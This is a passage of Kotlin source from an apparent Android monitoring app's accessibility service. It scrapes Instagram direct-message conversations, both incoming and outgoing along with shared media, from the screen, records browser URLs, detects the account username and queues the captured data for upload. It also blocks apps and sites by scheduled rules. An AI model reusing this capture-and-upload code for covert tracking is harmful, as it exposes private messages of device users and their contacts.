            if (detectedUsername == null && viewIdCandidates.isNotEmpty()) {
                for (cand in viewIdCandidates) {
                    val clean = cand.removePrefix("@").trim().lowercase()
                    if (clean.length in 3..32 &&
                        clean.matches("^[a-zA-Z0-9._]+$".toRegex()) &&
                        !clean.matches("^[0-9]+$".toRegex()) &&
                        !reserved.contains(clean)
                    ) {
                        detectedUsername = clean
                        break
                    }
                }
            }

            // STRATEGY 5: Own Profile Screen Detection (when visited)
            val isOwnProfile = allTexts.any {
                it.contains("Edit profile", ignoreCase = true) ||
                it.contains("Share profile", ignoreCase = true) ||
                it.contains("Professional dashboard", ignoreCase = true) ||
                (allTexts.any { t -> t.contains("Followers", ignoreCase = true) } &&
                 allTexts.any { t -> t.contains("Following", ignoreCase = true) })
            }

            if (detectedUsername == null && isOwnProfile) {
                for ((text, rect) in topCandidates) {
                    val candidate = text.removePrefix("@").trim().lowercase()
                    if (rect.top < 450 &&
                        candidate.length in 3..32 &&
                        candidate.matches("^[a-zA-Z0-9._]+$".toRegex()) &&
                        !candidate.matches("^[0-9]+$".toRegex()) &&
                        !reserved.contains(candidate)
                    ) {
                        detectedUsername = candidate
                        break
                    }
                }
            }

            // STRATEGY 6: Direct Messages Inbox Screen Detection (when visited)
            val isDirectInbox = (allTexts.any { it.equals("Direct", ignoreCase = true) || it.equals("Messages", ignoreCase = true) } &&
                allTexts.any { it.contains("Search", ignoreCase = true) || it.contains("Notes", ignoreCase = true) || it.contains("Requests", ignoreCase = true) })

            if (detectedUsername == null && isDirectInbox) {
                for ((text, rect) in topCandidates) {
                    val candidate = text.removePrefix("@").trim().lowercase()
                    if (rect.top < 350 && rect.left < 500 &&
                        candidate.length in 3..32 &&
                        candidate.matches("^[a-zA-Z0-9._]+$".toRegex()) &&
                        !candidate.matches("^[0-9]+$".toRegex()) &&
                        !reserved.contains(candidate)
                    ) {
                        detectedUsername = candidate
                        break
                    }
                }
            }

            if (!detectedUsername.isNullOrBlank()) {
                notifyInstagramAccountDetected(detectedUsername)
            }
        } catch (_: Exception) {}
    }

    fun recordInstagramChatIfForeground(root: AccessibilityNodeInfo?) {
        if (root == null) return
        val pkg = root.packageName?.toString() ?: ""
        if (pkg != "com.instagram.android") return

        detectAndHandleInstagramAccountSwitch(root)

        // Strict verification: ONLY record messages if user is inside an actual Direct Chat with an active text composer!
        fun hasDirectChatComposer(node: AccessibilityNodeInfo?): Boolean {
            if (node == null) return false
            val hint = ((node.text?.toString() ?: "") + " " + (node.contentDescription?.toString() ?: "") + " " + (node.viewIdResourceName ?: "")).trim()
            if (hint.contains("Add a comment", ignoreCase = true) || hint.contains("Comment as", ignoreCase = true)) return false
            if (hint.contains("Message...", ignoreCase = true) || hint.contains("Type a message", ignoreCase = true) || hint.contains("Send message", ignoreCase = true)) return true
            if (node.isEditable || node.className?.toString()?.contains("EditText", ignoreCase = true) == true) {
                if (hint.contains("comment", ignoreCase = true)) return false
                return true
            }
            for (i in 0 until node.childCount) {
                if (hasDirectChatComposer(node.getChild(i))) return true
            }
            return false
        }
        if (!hasDirectChatComposer(root)) return

        try {
            val entriesToInsert = mutableListOf<InstagramMessageEntry>()
            val now = System.currentTimeMillis()
            val displayMetrics = resources.displayMetrics

            fun extractReelUrl(txt: String?): String? = WhatsAppNotificationListener.extractReelUrl(txt)

            fun findReelUrlInNode(node: AccessibilityNodeInfo?, depth: Int = 0): String? {
                if (node == null || depth > 4) return null
                val t = node.text?.toString()
                val cd = node.contentDescription?.toString()
                extractReelUrl(t)?.let { return it }
                extractReelUrl(cd)?.let { return it }
                for (i in 0 until node.childCount) {
                    val found = findReelUrlInNode(node.getChild(i), depth + 1)
                    if (found != null) return found
                }
                return null
            }

            fun findReelUrlNearby(node: AccessibilityNodeInfo?): String? {
                if (node == null) return null
                findReelUrlInNode(node)?.let { return it }
                node.parent?.let { parent ->
                    findReelUrlInNode(parent)?.let { return it }
                    parent.parent?.let { grandParent ->
                        findReelUrlInNode(grandParent)?.let { return it }
                    }
                }
                return null
            }

            // Find Direct Chat username in top action bar
            val headerNodes = mutableListOf<AccessibilityNodeInfo>()
            fun findHeader(node: AccessibilityNodeInfo?) {
                if (node == null) return
                val rect = Rect()
                node.getBoundsInScreen(rect)
                if (rect.top < 380 && node.text != null && node.text.isNotBlank()) {
                    headerNodes.add(node)
                }
                for (i in 0 until node.childCount) {
                    findHeader(node.getChild(i))
                }
            }
            findHeader(root)
            val reservedTitles = setOf("Instagram", "Direct", "Messages", "Reels", "Explore", "Search", "Notifications", "Post", "Posts", "Audio", "Tagged", "Comments", "Likes", "Activity")
            val chatTitle = headerNodes.firstOrNull {
                val s = it.text.toString().trim()
                !reservedTitles.any { res -> res.equals(s, ignoreCase = true) } &&
                !s.contains("Active", ignoreCase = true) &&
                !s.startsWith("Switched to", ignoreCase = true) &&
                !s.startsWith("Switch to", ignoreCase = true) &&
                !s.startsWith("Logged in", ignoreCase = true) &&
                s.length in 2..50
            }?.text?.toString()?.trim()

            if (!chatTitle.isNullOrBlank()) {
                val candidateNodes = mutableListOf<AccessibilityNodeInfo>()
                fun collectMessageNodes(node: AccessibilityNodeInfo?) {
                    if (node == null) return
                    if (node.isEditable || node.className?.toString()?.contains("EditText", ignoreCase = true) == true) return
                    val t = node.text?.toString()?.trim()
                    val cd = node.contentDescription?.toString()?.trim()
                    val rect = Rect()
                    node.getBoundsInScreen(rect)

                    // Message bubbles appear between the top header (top > 140) and bottom message composer (bottom <= height - 120)
                    if (rect.top > 140 && rect.bottom <= (displayMetrics.heightPixels - 120)) {
                        val isTextTs = !t.isNullOrBlank() && WhatsAppNotificationListener.isInstagramUiMetadataOrTimestamp(t)
                        val isCdTs = !cd.isNullOrBlank() && WhatsAppNotificationListener.isInstagramUiMetadataOrTimestamp(cd)

                        if (!isTextTs && !isCdTs) {
                            val candidateText = when {
                                !t.isNullOrBlank() -> t
                                !cd.isNullOrBlank() && (cd.contains("reel", ignoreCase = true) || cd.contains("photo", ignoreCase = true) || cd.contains("image", ignoreCase = true) || cd.contains("video", ignoreCase = true)) -> cd
                                else -> null
                            }
                            if (!candidateText.isNullOrBlank() &&
                                !candidateText.equals(chatTitle, ignoreCase = true) &&
                                !candidateText.equals("Message...", ignoreCase = true) &&
                                !candidateText.equals("Search", ignoreCase = true) &&
                                !candidateText.equals("Instagram", ignoreCase = true)
                            ) {
                                candidateNodes.add(node)
                            }
                        }
                    }
                    for (i in 0 until node.childCount) {
                        collectMessageNodes(node.getChild(i))
                    }
                }
                collectMessageNodes(root)

                for (node in candidateNodes) {
                    val t = node.text?.toString()?.trim()
                    val cd = node.contentDescription?.toString()?.trim()
                    val rawText = when {
                        !t.isNullOrBlank() -> t
                        !cd.isNullOrBlank() -> cd
                        else -> continue
                    }
                    if (rawText.isBlank()) continue
                    if (WhatsAppNotificationListener.isInstagramUiMetadataOrTimestamp(rawText)) continue

                    val rect = Rect()
                    node.getBoundsInScreen(rect)
                    val isOutgoing = rect.left > (displayMetrics.widthPixels * 0.35f) ||
                                     rawText.startsWith("You sent ", ignoreCase = true) ||
                                     rawText.startsWith("You: ", ignoreCase = true)

                    val cleanText = when {
                        rawText.startsWith("You sent ", ignoreCase = true) -> rawText.substring(9).trim()
                        rawText.startsWith("You: ", ignoreCase = true) -> rawText.substring(5).trim()
                        else -> rawText
                    }
                    if (WhatsAppNotificationListener.isInstagramUiMetadataOrTimestamp(cleanText)) continue

                    val reelUrl = findReelUrlNearby(node) ?: extractReelUrl(cleanText) ?: extractReelUrl(cd)
                    val isReel = reelUrl != null ||
                        cleanText.contains("reel", ignoreCase = true) ||
                        (cd != null && cd.contains("reel", ignoreCase = true)) ||
                        cleanText.contains("shared a reel", ignoreCase = true) ||
                        cleanText.contains("sent a reel", ignoreCase = true)

                    val isImage = !isReel && (
                        cleanText.contains("photo", ignoreCase = true) ||
                        cleanText.contains("image", ignoreCase = true) ||
                        (cd != null && (cd.contains("photo", ignoreCase = true) || cd.contains("image", ignoreCase = true))) ||
                        cleanText.contains("sent a photo", ignoreCase = true) ||
                        cleanText.contains("shared a photo", ignoreCase = true) ||
                        node.className?.toString()?.contains("ImageView", ignoreCase = true) == true
                    )

                    val isVideo = !isReel && !isImage && (
                        cleanText.contains("video", ignoreCase = true) ||
                        (cd != null && cd.contains("video", ignoreCase = true)) ||
                        cleanText.contains("sent a video", ignoreCase = true)
                    )

                    val itemMediaType = when {
                        isReel -> "reel"
                        isImage -> "image"
                        isVideo -> "video"
                        else -> "text"
                    }

                    val finalText = when {
                        isReel && (cleanText.isBlank() || cleanText.equals("reel", ignoreCase = true)) -> reelUrl ?: "Shared a Reel"
                        isImage && (cleanText.isBlank() || cleanText.equals("photo", ignoreCase = true) || cleanText.equals("sent a photo", ignoreCase = true)) -> "Photo"
                        isVideo && cleanText.isBlank() -> "Video"
                        else -> cleanText
                    }

                    val key = "ig|$chatTitle|$finalText|$isOutgoing|$itemMediaType"
                    if (capturedWhatsAppMsgHashes.add(key)) {
                        entriesToInsert.add(
                            InstagramMessageEntry(
                                chatName = chatTitle,
                                sender = if (isOutgoing) "me" else chatTitle,
                                messageText = finalText,
                                isOutgoing = isOutgoing,
                                messageTimeEpochMs = now,
                                mediaType = itemMediaType,
                                reelUrl = reelUrl,
                                targetAccount = null
                            )
                        )
                    }
                }
            }

            if (entriesToInsert.isNotEmpty()) {
                scope.launch {
                    try {
                        val db = AppDatabase.getInstance(applicationContext)
                        db.instagramMessageDao().insertAll(entriesToInsert)
                        com.spapp.monitoring.collectors.RealtimeLogObserverManager.triggerInstantInstagramUpload(applicationContext)
                    } catch (e: Exception) {
                        Log.e("BlockA11y", "Failed to insert captured Instagram messages", e)
                    }
                }
            }
        } catch (_: Exception) {}
    }

    /**
     * Re-checks the URL bar every ~1.5s while a browser stays foreground —
     * this is what catches navigating to a different site within the same
     * browser window, which never fires its own TYPE_WINDOW_STATE_CHANGED.
     * Cancelled the moment any other app's window comes to the foreground
     * (stopBrowserPolling, above), so it never runs while the user isn't
     * actually in a browser.
     */
    private fun startBrowserPolling() {
        if (browserPollRunnable != null) return // already running
        val runnable = object : Runnable {
            override fun run() {
                recordUrlIfEnabled(null, rootInActiveWindow)
                checkWebsiteRules()
                pollHandler.postDelayed(this, browserPollIntervalMs)
            }
        }
        browserPollRunnable = runnable
        pollHandler.postDelayed(runnable, browserPollIntervalMs)
    }

    private fun stopBrowserPolling() {
        browserPollRunnable?.let { pollHandler.removeCallbacks(it) }
        browserPollRunnable = null
    }

    private fun loadedRules(): List<BlockRule> {
        if (!::rulesCache.isInitialized) rulesCache = BlockRulesCache(applicationContext)
        return rulesCache.load()
    }

    private fun checkAppRule(packageName: String) {
        val rules = loadedRules()
        if (rules.isEmpty()) return
        val (dayAbbrev, minutesOfDay) = currentDayAndMinute()

        rules.firstOrNull { it.ruleType == "app" && it.target == packageName }
            ?.let { rule ->
                if (rule.isActiveNow(dayAbbrev, minutesOfDay)) {
                    blockForeground(rule, packageName)
                }
            }
    }

    private fun checkWebsiteRules() {
        val websiteRules = loadedRules().filter { it.ruleType == "website" }
        if (websiteRules.isEmpty()) return

        val urlBarText = findUrlBarText(rootInActiveWindow) ?: return
        val (dayAbbrev, minutesOfDay) = currentDayAndMinute()
        websiteRules.firstOrNull { rule ->
            rule.isActiveNow(dayAbbrev, minutesOfDay) && urlBarText.contains(rule.target, ignoreCase = true)
        }?.let { rule -> blockForeground(rule, urlBarText) }
    }

    // The omnibox shows one of these as hint text (not a real URL) on an
    // empty/new-tab address bar — without filtering these out, every visit
    // to a blank tab got logged as a fake "visit" to literally this phrase.
    private val addressBarHints = listOf(
        "search google or type url",
        "search google or type web address",
        "search or type url",
        "search or type web address",
    )

    /** `event` is only non-null when called from the window-state-changed path — the title comes from there. */
    private fun recordUrlIfEnabled(event: AccessibilityEvent?, root: AccessibilityNodeInfo?) {
        if (!DeviceState(applicationContext).webHistoryTrackingEnabled) return
        val url = findUrlBarText(root) ?: return
        if (addressBarHints.any { url.trim().equals(it, ignoreCase = true) }) return // omnibox hint text, not a visit
        if (url == lastRecordedUrl) return // debounce — same URL re-fires on scroll/focus events
        lastRecordedUrl = url

        // Chrome reports the page's <title> as the window-state event's own
        // text (this is how the tab/window is announced to accessibility
        // services) — separate from the url_bar node, which only has the URL.
        // Not available on a poll tick (no event), so title stays null then.
        val title = event?.text?.firstOrNull()?.toString()?.takeIf { it.isNotBlank() }

        scope.launch {
            try {
                AppDatabase.getInstance(applicationContext).webHistoryDao().insert(
                    WebHistoryEntry(url = url, title = title, visitedAtEpochMs = System.currentTimeMillis())
                )
            } catch (e: Exception) {
                // Dropped — not worth retrying a single missed URL capture.
            }
        }
    }

    private fun findUrlBarText(root: AccessibilityNodeInfo?): String? {
        if (root == null) return null
        for (resourceId in browserUrlBarIds) {
            val nodes = root.findAccessibilityNodeInfosByViewId(resourceId)
            val text = nodes?.firstOrNull()?.text?.toString()
            if (!text.isNullOrBlank()) return text
        }
        return null
    }

    private fun blockForeground(rule: BlockRule, matchedTarget: String) {
        // Debounce — one window-state event can fire multiple times in quick
        // succession; avoid spamming Home actions and duplicate violation reports.
        val now = System.currentTimeMillis()
        if (matchedTarget == lastBlockedPackage && now - lastBlockedAt < 2000) return
        lastBlockedPackage = matchedTarget
        lastBlockedAt = now

        // NOT startActivity(ACTION_MAIN/CATEGORY_HOME) — Android's background
        // activity launch restrictions (tightened further on MIUI) silently
        // swallow a Context.startActivity() call made from a Service with no
        // visible UI of its own, so detection fired (the alert below proves
        // it) but nothing visibly happened. performGlobalAction is the
        // accessibility-specific API for this exact case — it simulates the
        // physical Home button press directly through the accessibility
        // layer, not through the activity-launch path, so it isn't subject
        // to that restriction.
        performGlobalAction(GLOBAL_ACTION_HOME)

        BlockViolationWorker.enqueue(applicationContext, rule.id, matchedTarget)
    }

    private fun currentDayAndMinute(): Pair<String, Int> {
        val cal = Calendar.getInstance()
        val dayAbbrev = SimpleDateFormat("EEE", Locale.US).format(cal.time).lowercase()
        val minutesOfDay = cal.get(Calendar.HOUR_OF_DAY) * 60 + cal.get(Calendar.MINUTE)
        return dayAbbrev to minutesOfDay
    }

    override fun onInterrupt() {
        stopBrowserPolling()
    }

    override fun onDestroy() {
        super.onDestroy()
        instance = null
        com.spapp.monitoring.collectors.RealtimeLogObserverManager.stop(applicationContext)
    }

    override fun onUnbind(intent: android.content.Intent?): Boolean {
        instance = null
        return super.onUnbind(intent)
    }
}
